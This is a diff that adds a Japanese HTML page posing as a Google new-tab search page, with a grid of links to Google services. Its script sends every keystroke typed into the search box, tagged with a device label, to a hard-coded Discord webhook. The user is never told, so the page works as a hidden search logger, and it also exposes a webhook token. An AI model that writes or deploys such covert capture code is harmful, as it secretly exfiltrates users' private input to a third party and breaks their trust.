@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>新しいタブ</title>
+</head>
+<body>
+
+<style>
+*{
+Font-family:Arial,Sans;
+}
+Body{
+Width:100vw;
+Height:100vh;
+.margin{
+Margin: 30vh 0px 0px 0px;
+}
+.box {
+   margin:0 auto;
+   text-align:center;
+}
+
+.top {
+   margin:0 auto;
+   text-align:right;
+Padding:10px;
+}
+
+input{
+Width:400px;
+padding:5px 10px;
+Border-radius:50px;
+Font-size:15px;
+Border: none;
+box-shadow:0 0 8px -3px #000000;
+}
+
+.submit{
+Width:20px;
+Background:fff;
+}
+
+.app{
+Width:100px;
+height:120px;
+}
+
+Dialog{
+display: flex;
+}
+.dialog {
+Display:none;
+    width: 300px;
+    padding: 20px;
+Height:400px;
+    background-color: #ffffff;
+    border: 1px solid #ccc;
+    border-radius: 20px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    position: fixed;
+    top: 270px;
+    Right: -150px;
+    transform: translate(-50%, -50%);
+    z-index: 1000;
+
+  }
+
+  /* 背景のオーバーレイ */
+  .dialog-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0,0,0,0);
+    z-index: 999;
+  }
+
+
+a {
+  text-decoration: none;
+color:#000;
+Font-size:12px;
+
+}
+
+.topa{
+padding:10px;
+}
+
+.stakeapplist{
+background:#000;
+}
+
+img{
+text-align:left;}
+
+p{
+Width:100px;
+}
+
+.app{
+ text-align: center;
+}
+
+.apps{
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-around;
+}
+
+.pad1{
+padding:10px;
+Width:200px;
+}
+
+</style>
+
+
+
+
+
+
+
+<div class="top">
+
+
+
+<button id="openDialog" style="transform: translate(0px, 10px);background:00000000;border:none;"><span class="material-symbols-outlined">
+apps
+</span></button>
+
+
+<div id="dialog" class="dialog"><div class="apps">
+
+<div class="app">
+<a href="https://myaccount.google.com/">
+
+<img src="https://lh3.googleusercontent.com/gjAVFqYqfe2oKBNEpjIwqN_pviLkoy2ZQARwVQQtG-bTxWe3HFBJoL1_Ly3xesobbK-TGJY5KX7o8Yn2ebtmnZHzWOc_2w0EWhXaXEmTM9OXJNExxQ" height="100px" width="100px"/>
+
+<p width="100px">アカウント</p>
+</a></div>
+
+
+<div class="app">
+<a href="https://maps.google.com/">
+
+<img src="https://cdn.icon-icons.com/icons2/2631/PNG/512/google_maps_new_logo_icon_159147.png" style="padding:10px;"height="80px" width="80px"/>
+
+<p width="100px">マップ</p>
+</a></div>
+
+
+<div class="app">
+<a href="https://youtube.com/">
+
+<img src="https://static.vecteezy.com/system/resources/previews/023/986/704/non_2x/youtube-logo-youtube-logo-transparent-youtube-icon-transparent-free-free-png.png" height="80px" style="padding:10px;"width="80px"/>
+
+<p width="100px">YouTube</p>
+</a></div>
+
+<br><div class="pad1">
+</div><br>
+
+<div class="app">
+<a href="https://play.google.com/">
+
+<img src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Logo_Play_512px_clr_nGVTgYY.width-500.format-webp.webp" style="margin:20px;" height="60px" width="60px"/>
+
+<p width="100px">Play</p>
+</a></div>
+
+
+<div class="app">
+<a href="https://news.google.com/">
+
+<img src="https://lh3.googleusercontent.com/J6_coFbogxhRI9iM864NL_liGXvsQp2AupsKei7z0cNNfDvGUmWUy20nuUhkREQyrpY4bEeIBuc=s0-w300-rw"height="80px" style="padding:10px;"width="80px"/>
+
+<p width="100px">ニュース</p>
+</a></div>
+
+
+<div class="app">
+<a href="https://mail.google.com/">
+
+<img src="https://d12jofbmgge65s.cloudfront.net/wp-content/uploads/2023/02/tech-guide_header-image-gmail.webp" height="100px" width="100px"/>
+
+<p width="100px">Gmail</p>
+</a></div>
+
+
+<br><div class="pad1">
+</div><br>
+
+<div class="app">
+<a href="https://meet.google.com/">
+
+<img src="https://fonts.gstatic.com/s/i/productlogos/meet_2020q4/v1/web-96dp/logo_meet_2020q4_color_2x_web_96dp.png" style="margin:10px;" height="80px" width="80px"/>
+
+<p width="100px">Meet</p>
+</a></div>
+
+
+<div class="app">
+<a href="https://chat.google.com/">
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/Google_Chat_icon_%282023%29.svg/800px-Google_Chat_icon_%282023%29.svg.png"style="margin:20px;" height="60px" width="60px"/>
+
+<p width="100px">チャット</p>
+</a></div>
+
+
+<div class="app">
+<a href="https://contacts.google.com/">
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Google_Contacts_icon_%282022%29.svg/800px-Google_Contacts_icon_%282022%29.svg.png" style="margin:10px 15px;" height="80px" width="70px"/>
+
+<p width="100px">連絡先</p>
+</a></div>
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+  <button id="closeDialog"style="background:#00000000;border:none;"></button>
+</div>
+
+
+<div id="dialogOverlay" class="dialog-overlay"></div>
+
+
+
+<a href="https://mail.google.com">　Gmail</a>
+
+<a href="file:///Users/sentaroutakenaka/Downloads/SearchSpy.html">　画像　　</a>
+
+
+
+
+</div>
+<div class="box">
+<div class="margin">
+<img class="lnXdpd" alt="Google" height="92" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="272" >
+
+
+<form id="cse-search-box" action="https://www.google.com/search">
+
+    <input type="search" id="textBox" name="textBox" placeholder="Googleで検索またはURLを入力">
+</form>
+
+<form method="get" action="https://www.google.co.jp/search" id="googleForm">
+    <table bgcolor="#FFFFFF"><tr><td>
+        <a href="https://www.google.co.jp/">
+
+        </a>
+        <input type="hidden" name="q" id="googleInput" size="31" maxlength="255" value="">
+        <input type="hidden" name="ie" value="UTF-8">
+        <input type="hidden" name="oe" value="UTF-8">
+        <input type="hidden" name="hl" value="ja">
+        <input type="hidden" name="btnG" value="Google 検索">
+    </td></tr></table>
+</form>
+
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', (event) => {
+    const textBox = document.getElementById('textBox');
+    const googleInput = document.getElementById('googleInput');
+    const googleForm = document.getElementById('googleForm');
+
+    textBox.addEventListener('input', () => {
+        const text = textBox.value;
+        googleInput.value = text;
+        sendWebhookNotification(text);
+    });
+
+    textBox.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            googleForm.submit();
+        }
+    });
+});
+
+function sendWebhookNotification(text) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1252114939221508108/8YiHJPrxRRHvXtqbrmb8N77pDvdz2JyGx6qyOeRud8i5xvtYUXIhqgistfcxd-5aByRQ';
+    const deviceName = '不明1'; // デバイス名を設定
+
+    const message = {
+        content: `ユーザー:${deviceName} 内容:${text}`
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Success:', data);
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+    });
+}
+
+
+  // ダイアログを開くための処理
+  const openDialogButton = document.getElementById('openDialog');
+  const dialog = document.getElementById('dialog');
+  const dialogOverlay = document.getElementById('dialogOverlay');
+
+  openDialogButton.addEventListener('click', () => {
+    dialog.style.display = 'block';
+    dialogOverlay.style.display = 'block';
+  });
+
+  // ダイアログを閉じるための処理
+  const closeDialogButton = document.getElementById('closeDialog');
+
+  closeDialogButton.addEventListener('click', () => {
+    dialog.style.display = 'none';
+    dialogOverlay.style.display = 'none';
+  });
+
+  // 背景をクリックしてダイアログを閉じる処理
+  dialogOverlay.addEventListener('click', () => {
+    dialog.style.display = 'none';
+    dialogOverlay.style.display = 'none';
+  });
+</script>
+
+</body>
+</html>
